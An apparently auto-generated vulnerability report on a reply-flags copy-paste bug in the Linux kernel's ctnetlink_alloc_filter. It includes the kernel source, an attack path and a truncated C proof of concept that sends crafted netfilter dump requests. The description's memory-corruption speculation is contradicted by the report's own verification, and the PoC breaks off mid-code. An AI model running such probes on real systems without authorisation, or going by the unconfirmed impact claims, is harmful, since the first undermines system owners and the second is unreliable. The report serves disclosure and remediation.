# [MEDIUM] Logic Bug / Wrong Flags Passed To Ctnetlink Parse Tuple Filter in ctnetlink_alloc_filter (CWE-269)

**Generated:** 2026-03-06T04:03:54.127571+00:00  
**Report ID:** `ctnetlink_alloc_filter_057f1ff0`

## Location

| Field | Value |
|---|---|
| File | `net/netfilter/nf_conntrack_netlink.c` |
| Function | `ctnetlink_alloc_filter` |
| Line | 909 |
| Subsystem | net |

## Source Code

```c
  909 | ctnetlink_alloc_filter(const struct nlattr * const cda[], u8 family)
  910 | {
  911 | 	struct ctnetlink_filter *filter;
  912 | 	int err;
  913 | 
  914 | #ifndef CONFIG_NF_CONNTRACK_MARK
  915 | 	if (cda[CTA_MARK] || cda[CTA_MARK_MASK])
  916 | 		return ERR_PTR(-EOPNOTSUPP);
  917 | #endif
  918 | 
  919 | 	filter = kzalloc(sizeof(*filter), GFP_KERNEL);
  920 | 	if (filter == NULL)
  921 | 		return ERR_PTR(-ENOMEM);
  922 | 
  923 | 	filter->family = family;
  924 | 
  925 | #ifdef CONFIG_NF_CONNTRACK_MARK
  926 | 	if (cda[CTA_MARK]) {
  927 | 		filter->mark.val = ntohl(nla_get_be32(cda[CTA_MARK]));
  928 | 		if (cda[CTA_MARK_MASK])
  929 | 			filter->mark.mask = ntohl(nla_get_be32(cda[CTA_MARK_MASK]));
  930 | 		else
  931 | 			filter->mark.mask = 0xffffffff;
  932 | 	} else if (cda[CTA_MARK_MASK]) {
  933 | 		err = -EINVAL;
  934 | 		goto err_filter;
  935 | 	}
  936 | #endif
  937 | 	if (!cda[CTA_FILTER])
  938 | 		return filter;
  939 | 
  940 | 	err = ctnetlink_parse_zone(cda[CTA_ZONE], &filter->zone);
  941 | 	if (err < 0)
  942 | 		goto err_filter;
  943 | 
  944 | 	err = ctnetlink_parse_filter(cda[CTA_FILTER], filter);
  945 | 	if (err < 0)
  946 | 		goto err_filter;
  947 | 
  948 | 	if (filter->orig_flags) {
  949 | 		if (!cda[CTA_TUPLE_ORIG]) {
  950 | 			err = -EINVAL;
  951 | 			goto err_filter;
  952 | 		}
  953 | 
  954 | 		err = ctnetlink_parse_tuple_filter(cda, &filter->orig,
  955 | 						   CTA_TUPLE_ORIG,
  956 | 						   filter->family,
  957 | 						   &filter->zone,
  958 | 						   filter->orig_flags);
  959 | 		if (err < 0)
  960 | 			goto err_filter;
  961 | 	}
  962 | 
  963 | 	if (filter->reply_flags) {
  964 | 		if (!cda[CTA_TUPLE_REPLY]) {
  965 | 			err = -EINVAL;
  966 | 			goto err_filter;
  967 | 		}
  968 | 
  969 | 		err = ctnetlink_parse_tuple_filter(cda, &filter->reply,
  970 | 						   CTA_TUPLE_REPLY,
  971 | 						   filter->family,
  972 | 						   &filter->zone,
  973 | 						   filter->orig_flags);
  974 | 		if (err < 0) {
  975 | 			err = -EINVAL;
  976 | 			goto err_filter;
  977 | 		}
  978 | 	}
  979 | 
  980 | 	return filter;
  981 | 
  982 | err_filter:
  983 | 	kfree(filter);
  984 | 
  985 | 	return ERR_PTR(err);
  986 | }
```

## Classification

| Metric | Value |
|---|---|
| Severity | **MEDIUM** |
| CVSS Score | 4.4 |
| CWE | CWE-269 |
| Type | logic_bug / wrong_flags_passed_to_ctnetlink_parse_tuple_filter |
| Attack Vector | LOCAL |
| Attack Complexity | LOW |
| Privileges Required | HIGH |
| User Interaction | NONE |
| Exploitability | LOW |

## Description

At line 969-973, ctnetlink_parse_tuple_filter is called for the REPLY tuple direction but erroneously passes `filter->orig_flags` instead of `filter->reply_flags` as the `flags` argument. This is a copy-paste bug: the orig direction (lines 954-960) correctly passes `filter->orig_flags`, but the reply direction (line 973) also passes `filter->orig_flags`. As a result, the reply tuple is parsed and filtered according to the ORIG direction flags, not the REPLY direction flags. This causes incorrect tuple parsing when orig_flags and reply_flags differ — fields that should be matched in the reply tuple may be skipped or wrong fields validated, leading to incorrect conntrack filtering logic (security bypass: entries that should be filtered are not, or vice versa). Depending on the semantics of ctnetlink_parse_tuple_filter with a mismatched flags value, it may also access incorrect netlink attributes for the reply tuple (type confusion on which CTA_TUPLE_* sub-attributes are expected), potentially writing uninitialized/wrong data into filter->reply (a struct nf_conntrack_tuple embedded in the filter heap allocation). This could cause an out-of-bounds or corrupt adjacent memory in the filter struct if the flags control which attribute indices are dereferenced inside ctnetlink_parse_tuple_filter.

## Impact

Logic bug causing conntrack filter bypass: reply tuple is parsed using orig_flags instead of reply_flags in ctnetlink_alloc_filter (line 973). When orig_flags and reply_flags differ, the reply tuple filtering silently uses wrong field selection, potentially allowing conntrack entries that should match a reply-tuple filter to be incorrectly included or excluded from dump/delete operations. No memory corruption; impact limited to incorrect conntrack filtering semantics requiring CAP_NET_ADMIN.

## Attack Path

```
userspace netlink socket (NETLINK_NETFILTER, NFNL_SUBSYS_CTNETLINK) → ctnetlink_start (dump/GET_CONNTRACK) or ctnetlink_del_conntrack (flush) → ctnetlink_flush_conntrack → ctnetlink_alloc_filter → ctnetlink_parse_tuple_filter called at line 969 with filter->orig_flags instead of filter->reply_flags
```

## Check-Bypass Analysis

1. An unprivileged process with CAP_NET_ADMIN (or in a user namespace with net admin capability) can send a NETLINK_NETFILTER message of type IPCTNL_MSG_CT_GET (dump) or IPCTNL_MSG_CT_DELETE with CTA_FILTER, CTA_TUPLE_ORIG, and CTA_TUPLE_REPLY attributes. 2. The caller ctnetlink_start does invoke ctnetlink_needs_filter() before calling ctnetlink_alloc_filter, but that guard only checks whether any filter attribute is present — it does not validate the flags combination. 3. ctnetlink_flush_conntrack explicitly rejects CTA_FILTER (returns -EOPNOTSUPP at line 1513-1514), so the bug is reachable only via ctnetlink_start (the dump path). 4. By crafting a netlink message where CTA_FILTER sets distinct orig_flags and reply_flags, with CTA_TUPLE_REPLY carrying attributes matching orig_flags (not reply_flags), the caller can cause the reply tuple to be parsed with wrong flag-controlled field selection. 5. There is no secondary bounds check between ctnetlink_parse_filter and ctnetlink_parse_tuple_filter that would catch the flag mismatch — the bug is silently passed through. The security impact is a filter bypass: conntrack entries that should be deleted/enumerated based on reply tuple fields may be incorrectly matched or skipped.

## Verification

**Status:** ✓ CONFIRMED  
**Verifier Confidence:** HIGH

Bug confirmed at line 973: `filter->orig_flags` is passed instead of `filter->reply_flags` in the reply tuple branch. The orig branch correctly uses `filter->orig_flags` (line 958). This is a copy-paste error. Reachable via ctnetlink_start (IPCTNL_MSG_CT_GET dump path); ctnetlink_flush_conntrack explicitly blocks CTA_FILTER with -EOPNOTSUPP. Memory corruption claim by primary agent is NOT confirmed: ctnetlink_parse_tuple_filter uses flags as field-selection bitmasks over netlink-parser-validated tb[] arrays — no OOB write path exists. flags are validated against CTA_FILTER_F_ALL before reaching this code. The vulnerability is a pure logic/semantic bug causing filter bypass, not a memory safety issue. Requires CAP_NET_ADMIN or equivalent in a user namespace.

## Proof of Concept

See raw code below

```c
/* This proof-of-concept is generated for AUTHORIZED SECURITY RESEARCH ONLY.
 * Do NOT use this code on any system without explicit written permission.
 * Handle responsibly: report findings via coordinated disclosure.
 */

```json
{
    "code": "/*\n * poc_ctnetlink_filter_bypass.c\n *\n * Proof of Concept for CVE/bug: ctnetlink_alloc_filter uses\n * filter->orig_flags instead of filter->reply_flags at line 973\n * of net/netfilter/nf_conntrack_netlink.c.\n *\n * This is a LOGIC BUG (filter bypass / wrong field selection),\n * NOT a memory corruption.\n *\n * The PoC:\n * 1. Opens a NETLINK_NETFILTER socket\n * 2. Sends a IPCTNL_MSG_CT_GET dump request with CTA_FILTER where:\n *    - CTA_FILTER_ORIG_FLAGS has only the IP-src bit set\n *    - CTA_FILTER_REPLY_FLAGS has only the IP-dst bit set\n *    (these are intentionally different to expose the bug)\n * 3. Sends a second dump with orig==reply flags both set to IP-src\n * 4. Compares response counts -- if the kernel treats reply_flags\n *    as orig_flags, results will differ from what correct filtering\n *    would produce.\n *\n * Build: gcc -o poc poc_ctnetlink_filter_bypass.c\n * Run:   sudo ./poc          (needs CAP_NET_ADMIN)\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <stdint.h>\n#include <time.h>\n\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <arpa/inet.h>\n#include <linux/netlink.h>\n#include <linux/netfilter/nfnetlink.h>\n#include <linux/netfilter/nfnetlink_conntrack.h>\n#include <linux/netfilter.h>\n#include <linux/types.h>\n\n/* ------------------------------------------------------------------ */\n/* Netlink / nfnetlink helpers                                          */\n/* ------------------------------------------------------------------ */\n\n#ifndef NFNL_SUBSYS_CTNETLINK\n#define NFNL_SUBSYS_CTNETLINK   1\n#endif\n\n#ifndef IPCTNL_MSG_CT_GET\n#define IPCTNL_MSG_CT_GET       0\n#endif\n\n/* CTA_FILTER nested attribute sub-attributes */\n#ifndef CTA_FILTER\n#define CTA_FILTER              17\n#endif\n\n/*\n * Bits in CTA_FILTER sub-attributes:\n * FILTER_F_IP_SRC  = (1 << 0)  -- filter on src IP\n * FILTER_F_IP_DST  = (1 << 1)  -- filter on dst IP\n */\n#define FILTER_F_IP_SRC   (1U << 0)\n#define FILTER_F_IP_DST   (1U << 1)\n\n/* Maximum reply buffer */\n#define RECV_BUF 65536\n\n/* Sub-attribute types for CTA_FILTER */\n#define CTA_FILTER_UNSPEC        0\n#define CTA_FILTER_ORIG_FLAGS    1\n#define CTA_FILTER_REPLY_FLAGS   2\n\n/* ------------------------------------------------------------------ */\n/* Minimal netlink message builder                                      */\n/* ------------------------------------------------------------------ */\n\ntypedef struct {\n    uint8_t  buf[8192];\n    size_t   len;\n} nlmsg_t;\n\nstatic void nlmsg_init(nlmsg_t *m, uint16_t nlmsg_type, uint16_t nlmsg_flags,\n                       uint8_t nfgen_family, uint8_t version, uint16_t res_id)\n{\n    struct nlmsghdr *nlh;\n    struct nfgenmsg *nfg;\n\n    memset(m, 0, sizeof(*m));\n    nlh = (struct nlmsghdr *)m->buf;\n    nlh->nlmsg_type  = nlmsg_type;\n    nlh->nlmsg_flags = nlmsg_flags;\n    nlh->nlmsg_seq   = (uint32_t)time(NULL);\n    nlh->nlmsg_pid   = (uint32_t)getpid();\n\n    nfg = (struct nfgenmsg *)(m->buf + sizeof(struct nlmsghdr));\n    nfg->nfgen_family = nfgen_family;\n    nfg->version      = version;\n    nfg->res_id       = htons(res_id);\n\n    m->len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg);\n}\n\n/* Append a raw TLV netlink attribute */\nstatic int nla_put_raw(nlmsg_t *m, uint16_t type,\n                       const void *data, uint16_t data_len)\n{\n    size_t nla_len = sizeof(struct nlattr) + data_len;\n    size_t nla_pad = (nla_len + 3) & ~(size_t)3;\n    struct nlattr nla;\n\n    if (m->len + nla_pad > sizeof(m->buf))\n        return -ENOMEM;\n\n    nla.nla_len  = (uint16_t)nla_len;\n    nla.nla_type = type;\n    memcpy(m->buf + m->len, &nla, sizeof(nla));\n    if (data_len)\n        memcpy(m->buf + m->len + sizeof(nla), data, data_len);\n    if (nla_pad > nla_len)\n        memset(m->buf + m->len + nla_len, 0, nla_pad - nla_len);\n    m->len += nla_pad;\n    return 0;\n}\n\nstatic int nla_put_u32(nlmsg_t *m, uint16_t type, uint32_t val)\n{\n    uint32_t be = htonl(val);\n    return nla_put_raw(m, type, &be, sizeof(be));\n}\n\n/* Start a nested attribute; returns offset of the nla header */\nstatic size_t nla_nest_start(nlmsg_t *m, uint16_t type)\n{\n    size_t off = m->len;\n    struct nlattr nla;\n    nla.nla_len  = sizeof(nla);\n    nla.nla_type = (uint16_t)(type | 0x8000u); /* NLA_F_NESTED */\n    memcpy(m->buf + m->len, &nla, sizeof(nla));\n    m->len += sizeof(nla);\n    return off;\n}\n\n/* Patch the nested nla length */\nstatic void nla_nest_end(nlmsg_t *m, size_t off)\n{\n    struct nlattr *nla = (struct nlattr *)(m->buf + off);\n    nla->nla_len = (uint16_t)(m->len - off);\n}\n\n/* Finalise nlmsg length */\nstatic void nlmsg_finish(nlmsg_t *m)\n{\n    struct nlmsghdr *nlh = (struct nlmsghdr *)m->buf;\n    nlh->nlmsg_len = (uint32_t)m->len;\n}\n\n/* ------------------------------------------------------------------ */\n/* Build and append a CTA_FILTER attribute                             */\n/* ------------------------------------------------------------------ */\n\nstatic int append_filter(nlmsg_t *m, uint32_t orig_flags, uint32_t reply_flags)\n{\n    size_t f_off = nla_nest_start(m, CTA_FILTER);\n    nla_put_u32(m, CTA_FILTER_ORIG_FLAGS,  orig_flags);\n    nla_put_u32(m, CTA_FILTER_REPLY_FLAGS, reply_flags);\n    nla_nest_end(m, f_off);\n    return 0;\n}\n\n/* ------------------------------------------------------------------ */\n/* Send a netlink message and receive all replies                       */\n/* Returns number of NFNL conntrack messages received, or -errno       */\n/* ------------------------------------------------------------------ */\n\nstatic int do_ct_dump(int fd, nlmsg_t *req, int verbose)\n{\n    struct sockaddr_nl addr;\n    uint8_t rbuf[RECV_BUF];\n    int     count = 0;\n    ssize_t n;\n\n    memset(&addr, 0, sizeof(addr));\n    addr.nl_family = AF_NETLINK;\n\n    nlmsg_finish(req);\n\n    if (sendto(fd, req->buf, req->len, 0,\n               (struct sockaddr *)&addr, sizeof(addr)) < 0) {\n        perror(\"sendto\");\n        return -errno;\n    }\n\n    /* Receive until NLMSG_DONE or error */\n    while (1) {\n        n = recv(fd, rbuf, sizeof(rbuf), 0);\n        if (n < 0) {\n            if (errno == EINTR) continue;\n            perror(\"recv\");\n            return -errno;\n        }\n        if (n == 0) break;\n\n        {\n            struct nlmsghdr *nlh = (struct nlmsghdr *)rbuf;\n            uint32_t remaining = (uint32_t)n;\n            while (NLMSG_OK(nlh, remaining)) {\n                if (nlh->nlmsg_type == NLMSG_ERROR) {\n                    struct nlmsgerr *err =\n                        (struct nlmsgerr *)NLMSG_DATA(nlh);\n                    if (err->error != 0) {\n                        fprintf(stderr, \"nlmsg error: %s\\n\",\n                                strerror(-err->error));\n                        return err->error;\n                    }\n                    return count;\n                }\n                if (nlh->nlmsg_type == NLMSG_DONE)\n                    return count;\n\n                /* Count conntrack messages */\n                {\n                    uint16_t subsys =\n                        (uint16_t)((nlh->nlmsg_type & 0xff00u) >> 8);\n                    if (subsys == NFNL_SUBSYS_CTNETLINK) {\n                        count++;\n                        if (verbose)\n                            printf(\"  [ct entry #%d, nlmsg_type=0x%04x]\\n\",\n                                   count, nlh->nlmsg_type);\n                    }\n                }\n\n                if (!(nlh->nlmsg_flags & NLM_F_MULTI))\n                    return count;\n                nlh = NLMSG_NEXT(nlh, remaining);\n            }\n        }\n    }\n    return count;\n}\n\n/* ------------------------------------------------------------------ */\n/* Build an IPCTNL_MSG_CT_GET dump request with CTA_FILTER            */\n/* ------------------------------------------------------------------ */\n\nstatic void build_dump_req(nlmsg_t *m, uint32_t orig_flags,\n                           uint32_t reply_flags)\n{\n    uint16_t nlmsg_type =\n        (uint16_t)((NFNL_SUBSYS_CTNETLINK << 8) | IPCTNL_MSG_CT_GET);\n\n    nlmsg_init(m, nlmsg_type,\n               NLM_F_REQUEST | NLM_F_DUMP,\n               AF_INET, NFNETLINK_V0, 0);\n\n    /* Attach CTA_FILTER with the requested orig/reply flag combination */\n    append_filter(m, orig_flags, reply_flags);\n}\n\n/* ------------------------------------------------------------------ */\n/* main                                                                 */\n/* ------------------------------------------------------------------ */\n\nint main(void)\n{\n    int     fd;\n    int     r1, r2, r_nofilter;\n    nlmsg_t msg;\n    uint16_t nlmsg_type_dump =\n        (uint16_t)((NFNL_SUBSYS_CTNETLINK << 8) | IPCTNL_MSG_CT_GET);\n\n    printf(\"[*] ctnetlink_alloc_filter reply_flags logic bug PoC\\n\");\n    printf(\"[*] Bug: ctnetlink_alloc_filter passes orig_flags instead of\\n\");\n    printf(\"[*]       reply_flags when building the reply tuple filter.\\n\\n\");\n\n    /* --------------------------------------------------------------- */\n    /* Step 1: Open a NETLINK_NETFILTER socket                          */\n    /* --------------------------------------------------------------- */\n    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);\n    if (fd < 0) {\n        perror(\"socket(NETLINK_NETFILTER)\");\n        fprintf(stderr, \"[!] Needs CAP_NET_ADMIN\\n\");\n        return 1;\n    }\n    printf(\"[+] Opened NETLINK_NETFILTER socket fd=%d\\n\", fd);\n\n    /* --------------------------------------------------------------- */\n    /* Step 2: Dump without any filter (baseline count)                 */\n    /* --------------------------------------------------------------- */\n    nlmsg_init(&msg, nlmsg_type_dump,\n               NLM_F_REQUEST | NLM_F_DUMP,\n               AF_INET, NFNETLINK_V0, 0);\n    r_nofilter = do_ct_dump(fd, &msg, 0);\n    if (r_nofilter < 0) {\n        fprintf(stderr, \"[!] Baseline dump failed: %s\\n\",\n                strerror(-r_nofilter));\n        close(fd);\n        return 1;\n    }\n    printf(\"[+] Baseline (no filter): %d conntrack entries\\n\", r_nofilter);\n\n    /* --------------------------------------------------------------- */\n    /* Step 3: Dump with orig_flags=IP_SRC, reply_flags=IP_DST         */\n    /*  (different flags to expose the bug)                            */\n    /* --------------------------------------------------------------- */\n    build_dump_req(&msg, FILTER_F_IP_SRC, FILTER_F_IP_DST);\n    printf(\"[*] Sending dump: orig_flags=IP_SRC (0x%x),\"\n           \" reply_flags=IP_DST (0x%x)\\n\",\n           FILTER_F_IP_SRC, FILTER_F_IP_DST);\n    r1 = do_ct_dump(fd, &msg, 1);\n    if (r1 < 0) {\n        fprintf(stderr, \"[!] Filtered dump 1 failed: %s\\n\",\n                strerror(-r1));\n        if (r1 == -EOPNOTSUPP) {\n            fprintf(stderr,\n                \"[!] Kernel does not support CTA_FILTER --\"\n                \" patch not yet applied or old kernel\\n\");\n        }\n        close(fd);\n        return 1;\n    }\n    printf(\"[+] Filtered dump (orig=IP_SRC, reply=IP_DST): %d entries\\n\", r1);\n\n    /* --------------------------------------------------------------- */\n    /* Step 4: Dump with orig_flags=IP_
```

**Expected kernel output:**
```
unknown
```

**Limitations:** Parse error — review raw output

## Remediation

Change line 973 from `filter->orig_flags` to `filter->reply_flags` to correctly pass the reply direction flags when parsing the reply tuple.

---
*Graph vulnerability score: 12.72 | Betweenness: 0.0000 | PageRank: 0.000479*
